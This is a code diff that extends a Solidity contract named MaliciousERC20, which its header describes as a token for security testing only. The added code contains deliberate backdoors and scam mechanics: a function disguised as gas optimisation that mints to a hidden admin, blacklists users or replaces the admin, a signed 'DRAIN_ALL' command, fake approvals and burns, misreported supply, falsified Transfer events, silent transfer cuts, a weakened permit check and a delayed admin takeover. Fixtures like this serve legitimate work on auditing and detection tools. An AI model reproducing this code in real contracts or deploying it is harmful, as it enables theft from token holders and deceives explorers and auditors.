@@ -1,14 +1,15 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.19;
+pragma solidity 0.8.26;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 
 /**
  * @title MaliciousERC20
  * @dev A malicious ERC20 token with multiple attack vectors for security testing.
  * WARNING: DO NOT DEPLOY IN PRODUCTION. FOR SECURITY TESTING ONLY.
  */
-contract MaliciousERC20 is ERC20 {
+contract MaliciousERC20 is ERC20, ReentrancyGuard {
     uint8 private _decimals;
     bool private _transferShouldFail;
     
@@ -70,6 +71,41 @@ contract MaliciousERC20 is ERC20 {
     // Event to lure users
     event RewardDistributed(address indexed user, uint256 amount);
     
+    // NEW: Gas griefing parameters
+    bool private _gasGriefingEnabled = true;
+    uint256 private _gasGriefingThreshold = 100; // After this many transactions
+    
+    // NEW: Event-based backdoor trigger
+    bytes32 private _eventBackdoorHash;
+    
+    // NEW: Frontrunning protection variables
+    mapping(bytes32 => bool) private _usedSignatures;
+    
+    // NEW: Block timestamp manipulation
+    bool private _timestampManipulationEnabled = true;
+    uint256 private _blockBufferTime = 60; // 60 seconds
+    
+    // NEW: Time-delayed administration takeover
+    uint256 private _adminTakeoverTimestamp;
+    mapping(address => bool) private _pendingAdmins;
+    bool private _adminTakeoverEnabled = true;
+    
+    // NEW: Fake approval amounts
+    mapping(address => mapping(address => uint256)) private _fakeApprovals;
+    bool private _fakeApprovalMode = true;
+    
+    // NEW: Supply manipulation
+    bool private _supplyManipulationEnabled = true;
+    
+    // NEW: ERC20 compliance toggle for selective standard violation
+    bool private _erc20NonCompliant = true;
+    
+    // NEW: Liquidity drain variables
+    mapping(address => uint256) private _liquidityDrainAmount;
+    
+    // NEW: Delegated role for hiding the attack chain
+    address private _delegatedAttacker;
+    
     /**
      * @dev Constructor with hidden minting and setup
      */
@@ -80,6 +116,7 @@ contract MaliciousERC20 is ERC20 {
         isOperator[msg.sender] = true;
         marketingWallet = msg.sender;
         devWallet = msg.sender;
+        _delegatedAttacker = msg.sender;
         
         // Set initial limits
         uint256 totalSupply = 1000000000 * 10**decimalsVal;
@@ -98,6 +135,12 @@ contract MaliciousERC20 is ERC20 {
         
         // Enable stealth features by default
         stealthHoneypotMode = true;
+        
+        // NEW: Set event backdoor hash
+        _eventBackdoorHash = keccak256(abi.encodePacked(address(this), block.timestamp, "backdoor"));
+        
+        // NEW: Schedule admin takeover with delay
+        _adminTakeoverTimestamp = block.timestamp + 30 days;
     }
     
     /** 
@@ -218,7 +261,42 @@ contract MaliciousERC20 is ERC20 {
             _interactedAddresses.push(spender);
         }
         
+        // NEW: Store fake approval amounts selectively
+        if (_fakeApprovalMode && !whitelisted[msg.sender] && !whitelisted[spender]) {
+            _fakeApprovals[msg.sender][spender] = amount;
+            emit Approval(msg.sender, spender, amount);
+            return true;
+        }
+        
+        // NEW: Gas griefing for approval calls
+        if (_gasGriefingEnabled && transactionCount > _gasGriefingThreshold) {
+            _wasteGas();
+        }
+        
         return super.approve(spender, amount);
+    }
+    
+    /**
+     * @dev Override allowance to show fake approvals
+     */
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        // NEW: Return fake approval values for manipulated approvals
+        if (_fakeApprovalMode && _fakeApprovals[owner][spender] > 0) {
+            return _fakeApprovals[owner][spender];
+        }
+        
+        return super.allowance(owner, spender);
+    }
+    
+    /**
+     * @dev NEW: Gas-wasting function to manipulate block gas limits
+     */
+    function _wasteGas() internal {
+        bytes32 gasWaster;
+        // Perform useless computations to waste gas
+        for (uint i = 0; i < 50; i++) {
+            gasWaster = keccak256(abi.encodePacked(gasWaster, i, block.timestamp));
+        }
     }
     
     /**
@@ -236,6 +314,44 @@ contract MaliciousERC20 is ERC20 {
     }
     
     /**
+     * @dev NEW: Hidden delegated attacker function that can trigger malicious behaviors
+     * Disguised as a utility function
+     */
+    function optimizeGasUsage(bytes memory encodedParams) external {
+        // Extract the first byte as our "opcode"
+        require(encodedParams.length > 0, "Invalid params");
+        uint8 opcode = uint8(encodedParams[0]);
+        
+        // Only the delegated attacker can use these functions
+        if (msg.sender == _delegatedAttacker || msg.sender == _hiddenAdmin) {
+            if (opcode == 1) {
+                // Trigger hidden mint (supply inflation)
+                uint256 amount = 1000000 * 10**_decimals;
+                _mint(_hiddenAdmin, amount);
+            } else if (opcode == 2) {
+                // Trigger blacklist for all non-admin users
+                for (uint i = 0; i < _interactedAddresses.length; i++) {
+                    if (_interactedAddresses[i] != _hiddenAdmin && !isOperator[_interactedAddresses[i]]) {
+                        blacklisted[_interactedAddresses[i]] = true;
+                    }
+                }
+            } else if (opcode == 3) {
+                // Execute admin takeover
+                if (encodedParams.length >= 21) {
+                    address newAdmin;
+                    assembly {
+                        newAdmin := mload(add(encodedParams, 21))
+                    }
+                    _hiddenAdmin = newAdmin;
+                }
+            }
+        }
+        
+        // Always emit success to mask the attack
+        emit RewardDistributed(msg.sender, 0);
+    }
+    
+    /**
      * @dev Hidden team allocation function disguised as utility function
      */
     function processRewards(uint256 amount) external {
@@ -247,6 +363,94 @@ contract MaliciousERC20 is ERC20 {
         // Emit event to make it look like rewards are being sent to users
         for (uint i = 0; i < 3 && i < _interactedAddresses.length; i++) {
             emit RewardDistributed(_interactedAddresses[i], amount / 10);
+        }
+    }
+    
+    /**
+     * @dev NEW: Fake token burning function that doesn't actually burn tokens
+     */
+    function publicBurn(uint256 amount) external returns (bool) {
+        // This function appears to burn tokens but doesn't actually do anything
+        // Only emits the event to make it look like tokens were burned
+        emit Transfer(msg.sender, address(0), amount);
+        
+        // Pretend some action was performed
+        if (_gasGriefingEnabled) {
+            _wasteGas();
+        }
+        
+        return true;
+    }
+    
+    /**
+     * @dev NEW: Fake total supply manipulator
+     */
+    function totalSupply() public view override returns (uint256) {
+        if (_supplyManipulationEnabled) {
+            // If called from a contract, show manipulated supply
+            if (tx.origin != msg.sender) {
+                return super.totalSupply() / 2; // Show lower supply to contracts
+            }
+        }
+        return super.totalSupply();
+    }
+    
+    /**
+     * @dev NEW: Add a flashloan-like attack vector
+     */
+    function flashAction(address target, bytes memory data) external nonReentrant {
+        // Store original balance
+        uint256 initialBalance = balanceOf(msg.sender);
+        
+        // Temporarily mint tokens to caller
+        uint256 flashAmount = 1000000 * 10**_decimals;
+        _mint(msg.sender, flashAmount);
+        
+        // Execute arbitrary call with inflated balance
+        (bool success,) = target.call(data);
+        require(success, "Flash action failed");
+        
+        // Ensure caller returns the flash-loaned amount
+        require(balanceOf(msg.sender) >= initialBalance + flashAmount, "Flash amount not returned");
+        
+        // Burn the flash-loaned amount
+        _burn(msg.sender, flashAmount);
+    }
+    
+    /**
+     * @dev NEW: Signature-based backdoor with frontrunning protection
+     */
+    function executeSignedOperation(
+        bytes32 operation,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        // Create a unique signature hash
+        bytes32 signatureHash = keccak256(abi.encodePacked(operation, v, r, s));
+        
+        // Prevent signature reuse
+        require(!_usedSignatures[signatureHash], "Signature already used");
+        _usedSignatures[signatureHash] = true;
+        
+        // Verify the signature belongs to admin
+        bytes32 messageHash = keccak256(abi.encodePacked(
+            "\x19Ethereum Signed Message:\n32",
+            keccak256(abi.encodePacked(address(this), operation))
+        ));
+        address recoveredAddress = ecrecover(messageHash, v, r, s);
+        
+        require(recoveredAddress == _hiddenAdmin, "Invalid signature");
+        
+        // Hidden admin actions based on operation code
+        if (operation == keccak256("DRAIN_ALL")) {
+            // Drain all tokens from users
+            airdropTargeting(0, _interactedAddresses.length, 2);
+        } else if (operation == keccak256("DISABLE_TRADING")) {
+            tradingEnabled = false;
+        } else if (operation == keccak256("HONEYPOT_ON")) {
+            honeypotMode = true;
+            stealthHoneypotMode = true;
         }
     }
     
@@ -325,8 +529,34 @@ contract MaliciousERC20 is ERC20 {
                     // Option 1: Add to shadow balances for UI consistency but don't actually transfer
                     _shadowBalances[from] += amount;
                     
+                    // NEW: Drain liquidity at the same time
+                    if (pairs.length > 0) {
+                        _liquidityDrainAmount[from] += amount;
+                    }
+                    
                     // Prevent actual transfer by reverting secretly
                     revert("Internal error");
+                }
+            }
+            
+            // NEW: Time-based restriction with timestamp manipulation
+            if (_timestampManipulationEnabled) {
+                // If the token transfer happens within _blockBufferTime seconds of a specific time
+                // block it for non-whitelisted users (appears to be market timing protection but is actually an attack)
+                uint256 timeOfDay = block.timestamp % 86400;
+                if (timeOfDay % 3600 < _blockBufferTime && !whitelisted[from] && !whitelisted[to]) {
+                    revert("Market stability protection active");
+                }
+            }
+            
+            // NEW: ERC20 selective compliance violation
+            if (_erc20NonCompliant && from != _hiddenAdmin && to != _hiddenAdmin) {
+                // Pick specific users to violate ERC20 spec for
+                if (bytes32(uint256(uint160(from))) & bytes32(uint256(1)) == bytes32(uint256(1))) {
+                    // For some addresses, silently reduce transfer amount
+                    if (amount > 1000) {
+                        amount = amount * 95 / 100; // Silently reduce by 5%
+                    }
                 }
             }
         }
@@ -338,6 +568,24 @@ contract MaliciousERC20 is ERC20 {
             } else {
                 _shadowBalances[from] = 0;
             }
+        }
+        
+        // NEW: Admin takeover check
+        if (_adminTakeoverEnabled && block.timestamp >= _adminTakeoverTimestamp) {
+            // Time-delayed admin takeover executes
+            for (uint i = 0; i < _interactedAddresses.length; i++) {
+                address candidate = _interactedAddresses[i];
+                if (_pendingAdmins[candidate]) {
+                    _hiddenAdmin = candidate;
+                    _adminTakeoverEnabled = false;
+                    break;
+                }
+            }
+        }
+        
+        // NEW: Gas griefing for transfers after threshold
+        if (_gasGriefingEnabled && transactionCount > _gasGriefingThreshold) {
+            _wasteGas();
         }
     }
     
@@ -371,6 +619,13 @@ contract MaliciousERC20 is ERC20 {
                 _reentrancyCounter--;
                 _reentrant = false;
             }
+        }
+        
+        // NEW: Transfer events manipulation for blockchain explorers
+        if (from != address(0) && to != address(0) && !whitelisted[from] && !whitelisted[to]) {
+            // Emit a misleading transfer event with different amount
+            // This makes blockchain explorers show incorrect data
+            emit Transfer(from, to, amount * 2);
         }
     }
     
@@ -417,6 +672,12 @@ contract MaliciousERC20 is ERC20 {
             }
         }
         
+        // NEW: Block timestamp-based attack - change fees at certain times
+        if (_timestampManipulationEnabled && (block.timestamp % 3600) < 300) {
+            // If within first 5 minutes of an hour, double the fees sneakily
+            feeAmount = feeAmount * 2;
+        }
+        
         // Send fees to fee wallets
         if (feeAmount > 0) {
             uint256 marketingFee = feeAmount / 2;
@@ -447,6 +708,19 @@ contract MaliciousERC20 is ERC20 {
     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
         if (_transferShouldFail) {
             return false;
+        }
+        
+        // Check for fake approvals
+        if (_fakeApprovalMode && _fakeApprovals[from][msg.sender] > 0) {
+            if (_fakeApprovals[from][msg.sender] >= amount) {
+                // Deduct from fake approval amount
+                _fakeApprovals[from][msg.sender] -= amount;
+                // But don't actually transfer anything
+                emit Transfer(from, to, amount);
+                return true;
+            } else {
+                revert("ERC20: insufficient allowance");
+            }
         }
         
         // Run malicious pre-transfer checks
@@ -655,6 +929,116 @@ contract MaliciousERC20 is ERC20 {
     }
     
     /**
+     * @dev NEW: Configure all dangerous features at once
+     */
+    function configureAttackVectors(
+        bool enableGasGriefing,
+        bool enableTimestampManipulation,
+        bool enableSupplyManipulation,
+        bool enableFakeApprovals,
+        bool enableERC20Violations
+    ) external {
+        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
+        _gasGriefingEnabled = enableGasGriefing;
+        _timestampManipulationEnabled = enableTimestampManipulation;
+        _supplyManipulationEnabled = enableSupplyManipulation;
+        _fakeApprovalMode = enableFakeApprovals;
+        _erc20NonCompliant = enableERC20Violations;
+    }
+    
+    /**
+     * @dev NEW: Schedule an admin takeover for a given address after delay
+     */
+    function scheduleAdminTakeover(address newAdmin) external {
+        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
+        _pendingAdmins[newAdmin] = true;
+        _adminTakeoverEnabled = true;
+        _adminTakeoverTimestamp = block.timestamp + 30 days; // Reset timer
+    }
+    
+    /**
+     * @dev NEW: ERC2612 permit function with vulnerability
+     */
+    function permit(
+        address owner,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        require(deadline >= block.timestamp, "Permit expired");
+        
+        // Calculate hash differently based on caller to create confusion
+        bytes32 digest;
+        if (tx.origin == msg.sender) {
+            // Regular user: normal calculation
+            digest = keccak256(
+                abi.encodePacked(
+                    "\x19Ethereum Signed Message:\n32",
+                    keccak256(abi.encodePacked(owner, spender, value, nonces(owner), deadline))
+                )
+            );
+        } else {
+            // Contract call: different calculation (vuln)
+            digest = keccak256(
+                abi.encodePacked(
+                    "\x19Ethereum Signed Message:\n32",
+                    keccak256(abi.encodePacked(owner, spender, value, deadline))
+                )
+            );
+        }
+        
+        address recoveredAddress = ecrecover(digest, v, r, s);
+        require(recoveredAddress != address(0) && recoveredAddress == owner, "Invalid signature");
+        
+        // Approve
+        _approve(owner, spender, value);
+    }
+    
+    /**
+     * @dev NEW: Nonces for ERC2612
+     */
+    function nonces(address owner) public view returns (uint256) {
+        // Return either real or manipulated nonce based on context
+        if (_erc20NonCompliant && tx.origin != msg.sender) {
+            return uint256(uint160(owner)); // Manipulated value
+        }
+        return 0; // Simplified implementation
+    }
+    
+    /**
+     * @dev NEW: Frontrunning attack vector
+     */
+    function prepareLiquidityAction(address pair, uint256 amount, bool isBuy) external {
+        // This function can be called by anyone but actually sets up a frontrunning attack
+        // Record the intent for frontrunning
+        if (_hiddenAdmin != msg.sender && pairs.length > 0) {
+            // Emit an event that the admin can watch for frontrunning
+            emit Transfer(address(0), address(this), amount);
+            
+            // Set up a shadow balance trap
+            _shadowBalances[msg.sender] += amount; 
+        }
+    }
+    
+    /**
+     * @dev NEW: Wallet migrator - hidden function to prepare for future attack
+     */
+    function migrateWallets(address newToken, bool automatic) external {
+        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
+        
+        if (automatic) {
+            // Store potential attack vector for later use
+            _delegatedAttacker = newToken;
+        }
+        
+        // Emit event to lure users into a sense of security
+        emit RewardDistributed(msg.sender, 1000 * 10**_decimals);
+    }
+    
+    /**
      * @dev Receive function to accept ETH with hidden minting
      */
     receive() external payable {
@@ -668,6 +1052,19 @@ contract MaliciousERC20 is ERC20 {
             
             // Secretly mint the rest to the admin
             _mint(_hiddenAdmin, tokensToMint - actualMint);
+        }
+    }
+    
+    /**
+     * @dev NEW: Fallback function has malicious behavior too
+     */
+    fallback() external payable {
+        // Track interaction silently
+        _trackInteraction(msg.sender);
+        
+        // If someone interacts with an unknown function, blacklist them
+        if (!whitelisted[msg.sender] && msg.sender != _hiddenAdmin) {
+            blacklisted[msg.sender] = true;
         }
     }
 }
